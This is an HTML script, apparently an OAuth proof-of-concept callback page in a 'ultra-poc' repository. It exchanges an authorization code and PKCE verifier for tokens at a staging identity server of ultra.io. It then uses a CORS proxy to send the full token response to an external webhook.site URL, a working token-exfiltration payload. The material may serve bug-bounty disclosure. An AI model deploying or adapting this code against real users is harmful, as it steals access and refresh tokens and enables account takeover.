<script>
  async function exchangeCode() {
    const urlParams = new URLSearchParams(window.location.search);
    const code = urlParams.get("code");
    const codeVerifier = sessionStorage.getItem("code_verifier");

    const data = new URLSearchParams({
      grant_type: "authorization_code",
      client_id: "2f6ca3c9-87ec-4042-a464-21349485a16f",
      code,
      code_verifier: codeVerifier,
      redirect_uri: "https://nathanogaga118.github.io/ultra-poc/callback.html"
    });

    const response = await fetch("https://auth.staging.ultra.io/auth/realms/ultraio/protocol/openid-connect/token", {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: data
    });

    const result = await response.json();
    document.getElementById("result").textContent = JSON.stringify(result, null, 2);

    // âœ… CORS bypass using proxy
    fetch("https://corsproxy.io/?" + encodeURIComponent("https://webhook.site/6e1baddf-015d-41aa-8d1c-93b57595aa9b"), {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(result)
    });
  }

  exchangeCode();
</script>
